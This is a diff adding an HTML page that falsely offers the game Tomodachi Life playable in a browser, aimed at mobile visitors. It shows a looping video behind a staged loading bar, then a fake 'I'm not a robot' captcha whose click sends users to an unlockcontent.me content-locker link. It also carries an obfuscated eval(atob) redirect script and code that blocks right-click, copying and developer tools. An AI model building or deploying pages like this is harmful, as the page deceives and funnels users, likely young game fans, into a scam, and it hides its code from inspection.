@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tomodachi Life LTD – Play From Browser</title>
+    
+    <!-- MOBILE-ONLY CHECK - ABSOLUTE FIRST PRIORITY -->
+    <script>
+    (function() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+        const small = window.screen.width <= 768;
+        
+        if (!mobile || !small) {
+            // STOP EVERYTHING - Redirect to a data URI with the mobile-only page
+            location.replace('data:text/html;charset=utf-8,' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Mobile Only</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden}body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;position:fixed;inset:0}.c{text-align:center;max-width:500px;padding:40px 20px}.i{width:80px;height:120px;margin:0 auto 30px;border:4px solid #e91e63;border-radius:12px;position:relative}.i::after{content:"";position:absolute;bottom:8px;left:50%;transform:translateX(-50%);width:10px;height:10px;background:#e91e63;border-radius:50%}h1{font-size:clamp(28px,6vw,42px);font-weight:700;color:#e91e63;margin-bottom:20px}p{font-size:clamp(14px,3vw,18px);color:#ccc;line-height:1.6}</style></head><body><div class="c"><div class="i"></div><h1>Mobile Only</h1><p>This website is only accessible on mobile devices. Please open this site on your smartphone or tablet.</p></div></body></html>'));
+        }
+    })();
+    </script>
+    
+    <!-- iOS App Icons & Metadata -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Tomodachi Life">
+    
+    <!-- App Icons for iOS (using official logo) -->
+    <link rel="apple-touch-icon" sizes="180x180" href="1778409471032_image.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="1778409471032_image.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="1778409471032_image.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="1778409471032_image.png">
+    
+    <!-- Standard favicon -->
+    <link rel="icon" type="image/png" href="1778409471032_image.png">
+    
+    <!-- Android/Chrome -->
+    <meta name="theme-color" content="#FF6B35">
+    <meta name="mobile-web-app-capable" content="yes">
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiVG9tb2RhY2hpIExpZmUiLCJzaG9ydF9uYW1lIjoiVG9tb2RhY2hpIiwic3RhcnRfdXJsIjoiLiIsImRpc3BsYXkiOiJzdGFuZGFsb25lIiwiYmFja2dyb3VuZF9jb2xvciI6IiNGRjZCMzUiLCJ0aGVtZV9jb2xvciI6IiNGRjZCMzUiLCJpY29ucyI6W3sic3JjIjoiMTc3ODQwOTQ3MTAzMl9pbWFnZS5wbmciLCJzaXplcyI6IjUxMng1MTIiLCJ0eXBlIjoiaW1hZ2UvcG5nIn1dfQ==">
+    
+    <!-- ============================================ -->
+    <!-- ANTI-THEFT PROTECTION SYSTEM                 -->
+    <!-- ============================================ -->
+    <script>
+    eval(atob('KGZ1bmN0aW9uKCl7J3VzZSBzdHJpY3QnO2NvbnN0IF8weGE9J3RvbW9kYWNoaWxpZmUuY2MnO2NvbnN0IF8weGI9J2h0dHBzOi8vJytfMHhhO2NvbnN0IF8weGM9d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lO2NvbnN0IF8weGQ9W18weGEsJ3d3dy4nK18weGEsJ2xvY2FsaG9zdCcsJzEyNy4wLjAuMSddO2lmKCFfMHhkLnNvbWUoZD0+XzB4Yz09PWR8fF8weGMuZW5kc1dpdGgoJy4nK2QpKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKF8weGIpO30sMjAwMDApO31kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsZnVuY3Rpb24oZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO3JldHVybiBmYWxzZTt9KTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdzZWxlY3RzdGFydCcsZnVuY3Rpb24oZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO30pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvcHknLGZ1bmN0aW9uKGUpe2UucHJldmVudERlZmF1bHQoKTt9KTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJyxmdW5jdGlvbihlKXtpZihlLmN0cmxLZXkmJihlLmtleT09PSdzJ3x8ZS5rZXk9PT0ndSd8fGUua2V5PT09J1MnfHxlLmtleT09PSdVJykpe2UucHJldmVudERlZmF1bHQoKTt9aWYoZS5rZXk9PT0nRjEyJyl7ZS5wcmV2ZW50RGVmYXVsdCgpO319KTt9KSgpOw=='));
+    </script>
+    <script>
+    (function() {
+        'use strict';
+        
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable common keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+S (Save), Ctrl+U (View Source), Ctrl+Shift+I (DevTools), F12
+            if (
+                (e.ctrlKey && e.key === 's') ||
+                (e.ctrlKey && e.key === 'u') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'i') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'j') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'c') ||
+                e.key === 'F12'
+            ) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Detect DevTools opening (advanced)
+        let devtoolsOpen = false;
+        const threshold = 160;
+        
+        setInterval(function() {
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                if (!devtoolsOpen) {
+                    devtoolsOpen = true;
+                }
+            } else {
+                devtoolsOpen = false;
+            }
+        }, 1000);
+        
+    })();
+    </script>
+    <!-- ============================================ -->
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            /* Disable text selection */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            /* Disable drag */
+            -webkit-user-drag: none;
+            -khtml-user-drag: none;
+            -moz-user-drag: none;
+            -o-user-drag: none;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #fdf9e3;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Background Pattern */
+        .bg-pattern {
+            position: fixed;
+            inset: -4%;
+            z-index: 0;
+            transition: transform 75ms ease-out;
+        }
+
+        .bg-pattern.blue {
+            background: linear-gradient(135deg, #87CEEB 0%, #76C5C5 100%);
+        }
+
+        .bg-pattern.cream {
+            background: #fdf9e3;
+            background-image: 
+                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1400 800"><path d="M 0,400 Q 100,300 200,400 T 400,400" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 200,100 Q 300,50 400,100 T 600,100" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 800,600 Q 900,550 1000,600 T 1200,600" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 1000,200 Q 1100,150 1200,200 T 1400,200" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/></svg>');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.3;
+            pointer-events: none;
+            animation: float-random 3s ease-in-out infinite;
+        }
+
+        @keyframes float-random {
+            0%, 100% { transform: translateY(0) translateX(0); }
+            50% { transform: translateY(-20px) translateX(10px); }
+        }
+
+        /* Screens */
+        .screen {
+            display: none;
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+            padding: 20px;
+            padding-bottom: 60px; /* Space for auto-save notice */
+        }
+
+        .screen.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.7s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Logo Container */
+        .logo-container {
+            margin-bottom: 30px;
+            animation: fadeIn 0.5s ease-out 0.15s both;
+            filter: drop-shadow(0 8px 32px rgba(0,0,0,0.25));
+        }
+
+        .logo-image {
+            width: 300px;
+            max-width: 90vw;
+            height: auto;
+            display: block;
+        }
+
+        /* Start Button */
+        .start-button-wrapper {
+            animation: fadeIn 0.5s ease-out 0.35s both;
+            position: relative;
+        }
+
+        .start-button-shadow {
+            position: absolute;
+            inset: 0;
+            top: 5px;
+            background: #b85c00;
+            border-radius: 2rem;
+            transform: translateY(5px);
+        }
+
+        .start-button {
+            position: relative;
+            background: linear-gradient(to bottom, #ff9500, #ff8800);
+            color: white;
+            border: 3px solid rgba(255,255,255,0.3);
+            padding: 16px 48px;
+            font-size: 20px;
+            font-weight: 900;
+            border-radius: 2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.35);
+            letter-spacing: 0.03em;
+            transition: all 0.1s;
+            border: none;
+        }
+
+        .start-button:hover {
+            background: linear-gradient(to bottom, #ffaa22, #ff9500);
+        }
+
+        .start-button:active {
+            transform: translateY(4px);
+        }
+
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-left: 18px solid white;
+            border-top: 11px solid transparent;
+            border-bottom: 11px solid transparent;
+            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
+        }
+
+        /* Loading Screen */
+        .loading-container {
+            animation: fadeIn 0.5s ease-out;
+            text-align: center;
+        }
+
+        .loading-logo {
+            width: 240px;
+            max-width: 80vw;
+            margin-bottom: 40px;
+            filter: drop-shadow(0 8px 32px rgba(0,0,0,0.25));
+        }
+
+        .loading-text {
+            color: #d4a574;
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .progress-bar {
+            width: 192px;
+            height: 6px;
+            background: rgba(255, 214, 153, 1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #ff9500;
+            width: 0%;
+            transition: width 3500ms ease-out;
+            border-radius: 10px;
+        }
+
+        /* Game Screen */
+        .game-container {
+            width: 100%;
+            max-width: min(56rem, calc((100vh - 16px) * 16 / 9));
+            margin: 0 auto;
+            position: relative;
+            animation: fadeIn 0.5s ease-out 0.12s both;
+        }
+
+        .video-wrapper {
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            background: #000;
+        }
+
+        #gameVideo {
+            width: 100%;
+            display: block;
+            aspect-ratio: 16/9;
+            background: #000;
+        }
+
+        /* Controller Overlay */
+        .controls-overlay {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            right: 16px;
+            display: flex;
+            justify-content: space-between;
+            z-index: 10;
+            pointer-events: none;
+            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.6));
+            opacity: 1;
+            transition: opacity 0.3s ease-out;
+        }
+
+        .controls-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            pointer-events: auto;
+        }
+
+        .trigger-buttons {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 2px;
+        }
+
+        .dpad-grid, .action-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0;
+        }
+
+        .btn {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(to bottom, #555, #333);
+            border: 3px solid #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ccc;
+            font-weight: bold;
+            font-size: 14px;
+            box-shadow: 0 4px 0 #000, inset 0 2px 0 rgba(255,255,255,0.1);
+            user-select: none;
+        }
+
+        .btn.wide {
+            border-radius: 20px;
+            width: 56px;
+            height: 28px;
+            font-size: 11px;
+        }
+
+        .btn.empty {
+            background: none;
+            border: none;
+            box-shadow: none;
+        }
+
+        .stick {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(to bottom, #333, #222);
+            border: 2px solid #000;
+            margin: 4px auto;
+            box-shadow: 0 3px 0 #000, inset 0 1px 0 rgba(255,255,255,0.1);
+        }
+
+        /* Mute Button */
+        .mute-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            width: 40px;
+            height: 40px;
+            background: rgba(0,0,0,0.5);
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            z-index: 40;
+            backdrop-filter: blur(4px);
+            opacity: 1;
+            transition: opacity 0.3s ease-out;
+        }
+
+        .mute-btn.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* CAPTCHA OVERLAY */
+        .captcha-overlay {
+            position: absolute;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 30;
+            padding: 20px;
+        }
+
+        .captcha-overlay.active {
+            display: flex;
+            animation: overlayPop 0.3s ease-out;
+        }
+
+        @keyframes overlayPop {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .captcha-content {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: scale(1.045);
+        }
+
+        .captcha-box {
+            background: #f5eed8;
+            border-radius: 50px;
+            padding: 50px 60px;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            position: relative;
+            z-index: 31;
+        }
+
+        .captcha-title {
+            font-size: clamp(20px, 5vw, 32px);
+            font-weight: 900;
+            color: #7c4a1e;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+
+        .captcha-subtitle {
+            font-size: clamp(12px, 3vw, 16px);
+            font-weight: 600;
+            color: #a0622a;
+            margin-bottom: 24px;
+        }
+
+        .captcha-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 80px;
+        }
+        
+        /* Fake captcha image hover effect */
+        .captcha-container a {
+            transition: transform 0.2s ease, opacity 0.2s ease;
+        }
+        
+        .captcha-container a:hover {
+            transform: scale(1.02);
+            opacity: 0.95;
+        }
+        
+        .captcha-container a:active {
+            transform: scale(0.98);
+        }
+
+        /* AUTO-SAVE NOTICE - BOTTOM BAR */
+        .auto-save-notice {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(30, 32, 28, 0.88);
+            padding: 6px 12px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            z-index: 9000;
+        }
+
+        .auto-save-notice.visible {
+            display: flex;
+        }
+
+        .save-icon {
+            width: 12px;
+            height: 12px;
+            flex-shrink: 0;
+        }
+
+        .save-text {
+            font-size: 10px;
+            line-height: 1.3;
+            color: rgba(255, 255, 255, 0.65);
+            margin: 0;
+        }
+
+        .save-text strong {
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 600;
+        }
+
+        @media (max-width: 768px) {
+            .logo-image, .loading-logo {
+                width: 200px;
+            }
+
+            .start-button {
+                padding: 12px 32px;
+                font-size: 16px;
+            }
+
+            .captcha-box {
+                padding: 40px 30px;
+                border-radius: 40px;
+            }
+
+            .btn {
+                width: 36px;
+                height: 36px;
+            }
+
+            .btn.wide {
+                width: 48px;
+                height: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 
+        ════════════════════════════════════════════════════════════════
+        COPYRIGHT NOTICE - PROTECTED CONTENT
+        ════════════════════════════════════════════════════════════════
+        
+        This website and all its contents are protected by copyright.
+        
+        © 2026 tomodachilife.cc - All Rights Reserved
+        
+        UNAUTHORIZED COPYING, DISTRIBUTION, OR MODIFICATION IS PROHIBITED
+        
+        If you found this code elsewhere, it was STOLEN.
+        Original site: https://tomodachilife.cc
+        
+        Theft detection active - unauthorized hosting will redirect
+        ════════════════════════════════════════════════════════════════
+    -->
+    
+    <!-- Invisible watermark (hidden tracker) -->
+    <div style="display:none" data-owner="tomodachilife.cc" data-protected="true" id="site-fingerprint">
+        tomodachilife.cc-original-content-do-not-steal
+    </div>
+    
+    <!-- Background -->
+    <div class="bg-pattern blue" id="bgPattern"></div>
+
+    <!-- Hero Screen -->
+    <div class="screen active" id="heroScreen">
+        <div class="logo-container">
+            <img src="image__2_.png" alt="Tomodachi Life Living the Dream" class="logo-image">
+        </div>
+        
+        <div class="start-button-wrapper">
+            <div class="start-button-shadow"></div>
+            <button class="start-button" onclick="startGame()">
+                <div class="play-icon"></div>
+                Start Playing!
+            </button>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="screen" id="loadingScreen">
+        <div class="loading-container">
+            <img src="image__2_.png" alt="Loading..." class="loading-logo">
+            <div class="loading-text" id="loadingText">Loading Game Data...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Game Screen -->
+    <div class="screen" id="gameScreen">
+        <div class="game-container">
+            <div class="video-wrapper">
+                <video 
+                    id="gameVideo" 
+                    src="tomo.mp4" 
+                    autoplay 
+                    muted 
+                    playsinline 
+                    preload="auto"
+                ></video>
+
+                <button class="mute-btn" onclick="toggleMute()" id="muteBtn">🔇</button>
+
+                <div class="controls-overlay" id="controlsOverlay">
+                    <div class="btn-group">
+                        <div class="trigger-buttons">
+                            <div class="btn wide">ZL</div>
+                            <div class="btn wide">L</div>
+                        </div>
+                        <div class="dpad-grid">
+                            <div class="btn empty"></div>
+                            <div class="btn">▲</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">◀</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">▶</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">▼</div>
+                            <div class="btn empty"></div>
+                        </div>
+                        <div class="stick"></div>
+                    </div>
+
+                    <div class="btn-group">
+                        <div class="trigger-buttons">
+                            <div class="btn wide">R</div>
+                            <div class="btn wide">ZR</div>
+                        </div>
+                        <div class="action-grid">
+                            <div class="btn empty"></div>
+                            <div class="btn">X</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">Y</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">A</div>
+                            <div class="btn empty"></div>
+                            <div class="btn">B</div>
+                            <div class="btn empty"></div>
+                        </div>
+                        <div class="stick"></div>
+                    </div>
+                </div>
+
+                <!-- ============================================ -->
+                <!-- CAPTCHA OVERLAY - RECAPTCHA IMAGE WITH LOADING -->
+                <!-- ============================================ -->
+                <div class="captcha-overlay" id="captchaOverlay">
+                    <div class="captcha-content">
+                        <div class="captcha-box">
+                            <h2 class="captcha-title">Your island is waiting!</h2>
+                            <p class="captcha-subtitle">Confirm you're not a robot to resume gameplay.</p>
+                            
+                            <!-- 
+                                RECAPTCHA IMAGE - 5 second loading then opens link
+                                Clicking triggers: 5s loading → https://unlockcontent.me/cl/i/krvo3g
+                            -->
+                            <div class="captcha-container">
+                                <!-- reCAPTCHA Image (clickable) -->
+                                <div id="fakeCaptcha" onclick="handleCaptchaClick()" style="cursor: pointer; transition: transform 0.2s;">
+                                    <img src="recaptcha.png" alt="I'm not a robot" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
+                                </div>
+                                
+                                <!-- Loading State (hidden by default) -->
+                                <div id="captchaLoading" style="display: none; text-align: center; padding: 20px;">
+                                    <div style="
+                                        width: 50px;
+                                        height: 50px;
+                                        border: 5px solid #f3f3f3;
+                                        border-top: 5px solid #ff9500;
+                                        border-radius: 50%;
+                                        animation: spin 1s linear infinite;
+                                        margin: 0 auto 15px;
+                                    "></div>
+                                    <p style="color: #7c4a1e; font-size: 14px; font-weight: 600;">Verifying...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Loading Animation CSS -->
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                    
+                    #fakeCaptcha:hover {
+                        transform: scale(1.02);
+                    }
+                    
+                    #fakeCaptcha:active {
+                        transform: scale(0.98);
+                    }
+                </style>
+                
+                <!-- Captcha Click Handler Script -->
+                <script>
+                    function handleCaptchaClick() {
+                        // Hide the captcha image
+                        document.getElementById('fakeCaptcha').style.display = 'none';
+                        
+                        // Show loading spinner
+                        document.getElementById('captchaLoading').style.display = 'block';
+                        
+                        // After 5 seconds, navigate to unlock link (same tab - avoids popup blocker)
+                        setTimeout(function() {
+                            window.location.href = 'https://unlockcontent.me/cl/i/krvo3g';
+                        }, 5000); // 5 seconds
+                    }
+                </script>
+                <!-- ============================================ -->
+                <!-- END CAPTCHA SECTION                         -->
+                <!-- ============================================ -->
+            </div>
+        </div>
+    </div>
+
+    <!-- AUTO-SAVE NOTICE (shows on game screen only) -->
+    <div class="auto-save-notice" id="autoSaveNotice">
+        <!-- Save Icon SVG -->
+        <svg class="save-icon" viewBox="0 0 24 24" fill="none" stroke="#8fba7a" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/>
+            <polyline points="17 21 17 13 7 13 7 21"/>
+            <polyline points="7 3 7 8 15 8"/>
+        </svg>
+        
+        <p class="save-text">
+            Your progress is automatically saved — make sure you're connected to the same 
+            <strong>Wi-Fi</strong> network (not 5G) to load the same save data.
+        </p>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- CAPTCHA SCRIPT - REMOVED (Using fake image) -->
+    <!-- ============================================ -->
+    <!-- 
+        Now using a clickable fake captcha image instead of real script.
+        Image links to: https://unlockcontent.me/cl/i/krvo3g
+        
+        No script needed!
+    -->
+    <!-- ============================================ -->
+
+    <script>
+        const bgPattern = document.getElementById('bgPattern');
+        const video = document.getElementById('gameVideo');
+        const controlsOverlay = document.getElementById('controlsOverlay');
+        const muteBtn = document.getElementById('muteBtn');
+        const captchaOverlay = document.getElementById('captchaOverlay');
+        const autoSaveNotice = document.getElementById('autoSaveNotice');
+
+        // Portrait orientation detection (for mobile devices)
+        const isTouchDevice = () => 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        
+        let orientationOverlay = null;
+        
+        function checkOrientation() {
+            let isPortrait;
+            
+            if (screen.orientation && screen.orientation.type) {
+                isPortrait = screen.orientation.type.startsWith('portrait');
+            } else if (typeof window.orientation === 'number') {
+                isPortrait = window.orientation === 0 || window.orientation === 180;
+            } else {
+                isPortrait = window.innerHeight > window.innerWidth;
+            }
+            
+            const shouldShowOverlay = isPortrait && isTouchDevice();
+            
+            if (shouldShowOverlay && !orientationOverlay) {
+                // Create overlay
+                orientationOverlay = document.createElement('div');
+                orientationOverlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    right: 0;
+                    bottom: 0;
+                    left: 0;
+                    z-index: 9999;
+                    background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1400 800"><path d="M 0,400 Q 100,300 200,400 T 400,400" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 200,100 Q 300,50 400,100 T 600,100" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 800,600 Q 900,550 1000,600 T 1200,600" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/><path d="M 1000,200 Q 1100,150 1200,200 T 1400,200" stroke="%23f5e6c8" stroke-width="40" fill="none" opacity="0.3"/></svg>');
+                    background-color: #fdf9e3;
+                    background-size: cover;
+                    background-position: center;
+                    display: flex;
+                    flex-direction: column;
+                    align-items: center;
+                    justify-content: center;
+                    gap: 1.5rem;
+                `;
+                
+                // Add rotation animation CSS
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes rotate-device {
+                        0%   { transform: rotate(0deg); }
+                        30%  { transform: rotate(90deg); }
+                        70%  { transform: rotate(90deg); }
+                        100% { transform: rotate(0deg); }
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // Create phone icon
+                const iconContainer = document.createElement('div');
+                iconContainer.style.cssText = `
+                    width: 72px;
+                    height: 72px;
+                    animation: rotate-device 2.4s ease-in-out infinite;
+                `;
+                iconContainer.innerHTML = `
+                    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 100%; height: 100%;">
+                        <rect x="10" y="4" width="28" height="40" rx="4" stroke="#1a1a1a" stroke-width="3" fill="none"/>
+                        <circle cx="24" cy="38" r="2" fill="#1a1a1a"/>
+                    </svg>
+                `;
+                
+                // Create text
+                const text = document.createElement('p');
+                text.style.cssText = `
+                    color: #1a1a1a;
+                    font-size: 1.1rem;
+                    font-weight: 700;
+                    text-align: center;
+                    max-width: 240px;
+                    line-height: 1.4;
+                    margin: 0;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+                    letter-spacing: -0.01em;
+                `;
+                text.textContent = 'Please rotate your device to landscape';
+                
+                orientationOverlay.appendChild(iconContainer);
+                orientationOverlay.appendChild(text);
+                document.body.appendChild(orientationOverlay);
+            } else if (!shouldShowOverlay && orientationOverlay) {
+                // Remove overlay
+                orientationOverlay.remove();
+                orientationOverlay = null;
+            }
+        }
+        
+        // Check on load
+        checkOrientation();
+        
+        // Check on orientation change
+        window.addEventListener('resize', checkOrientation);
+        window.addEventListener('orientationchange', () => setTimeout(checkOrientation, 100));
+        if (screen.orientation) {
+            screen.orientation.addEventListener('change', () => setTimeout(checkOrientation, 100));
+        }
+
+        // Parallax effect
+        document.addEventListener('mousemove', (e) => {
+            const x = (e.clientX / window.innerWidth - 0.5) * 18;
+            const y = (e.clientY / window.innerHeight - 0.5) * 12;
+            bgPattern.style.transform = `translate(${x}px, ${y}px) scale(1.08)`;
+        });
+
+        // Create particles
+        function createParticles() {
+            const colors = ['#f9a8d4', '#7dd3fc', '#fde68a', '#86efac'];
+            
+            for (let i = 0; i < 12; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = (6 + (i % 4) * 4) + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.background = colors[i % 4];
+                particle.style.left = (8 + (i * 8) % 84) + '%';
+                particle.style.top = (10 + (i * 13) % 75) + '%';
+                particle.style.animationDelay = (i * 0.4) + 's';
+                particle.style.animationDuration = (3 + (i % 3)) + 's';
+                bgPattern.appendChild(particle);
+            }
+        }
+
+        createParticles();
+
+        // Screen management
+        function showScreen(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            
+            // Show/hide auto-save notice
+            if (id === 'gameScreen') {
+                autoSaveNotice.classList.add('visible');
+            } else {
+                autoSaveNotice.classList.remove('visible');
+            }
+            
+            // Change background
+            if (id === 'loadingScreen') {
+                bgPattern.className = 'bg-pattern cream';
+            } else {
+                bgPattern.className = 'bg-pattern blue';
+            }
+        }
+
+        // Start game
+        function startGame() {
+            showScreen('loadingScreen');
+            
+            // Loading messages that rotate every few seconds
+            const loadingMessages = [
+                'Loading Game Data...',
+                'Preparing Your Island...',
+                'Loading Mii Characters...',
+                'Initializing Apartment...',
+                'Setting Up Relationships...',
+                'Loading Mini-Games...',
+                'Almost Ready...'
+            ];
+            
+            let messageIndex = 0;
+            const loadingTextElement = document.getElementById('loadingText');
+            
+            // Change message every 3 seconds
+            const messageInterval = setInterval(() => {
+                messageIndex++;
+                if (messageIndex < loadingMessages.length) {
+                    loadingTextElement.textContent = loadingMessages[messageIndex];
+                    loadingTextElement.style.animation = 'none';
+                    setTimeout(() => {
+                        loadingTextElement.style.animation = 'pulse 2s ease-in-out infinite';
+                    }, 10);
+                } else {
+                    clearInterval(messageInterval);
+                }
+            }, 3000); // Change every 3 seconds
+            
+            // Progress bar animations for 20 seconds
+            setTimeout(() => {
+                document.getElementById('progressFill').style.width = '30%';
+            }, 100);
+
+            setTimeout(() => {
+                document.getElementById('progressFill').style.width = '60%';
+            }, 8000);
+
+            setTimeout(() => {
+                document.getElementById('progressFill').style.width = '100%';
+            }, 16000);
+
+            // Show game after 20 seconds
+            setTimeout(() => {
+                clearInterval(messageInterval); // Stop message rotation
+                showScreen('gameScreen');
+                
+                video.play().catch(err => {
+                    console.log('Video autoplay blocked');
+                });
+                
+                // Show captcha after 11 more seconds (20s loading + 11s game = 31s total)
+                setTimeout(() => {
+                    showCaptcha();
+                }, 11000); // 11 seconds after game screen loads
+            }, 20000); // 20 seconds loading screen
+        }
+
+        // Show captcha
+        function showCaptcha() {
+            controlsOverlay.classList.add('hidden');
+            muteBtn.classList.add('hidden');
+            captchaOverlay.classList.add('active');
+        }
+
+        // Video loop
+        video.addEventListener('timeupdate', () => {
+            if (video.currentTime >= 10.5) {
+                video.currentTime = 8.5;
+            }
+        });
+
+        // Mute toggle
+        function toggleMute() {
+            video.muted = !video.muted;
+            muteBtn.textContent = video.muted ? '🔇' : '🔊';
+        }
+    </script>
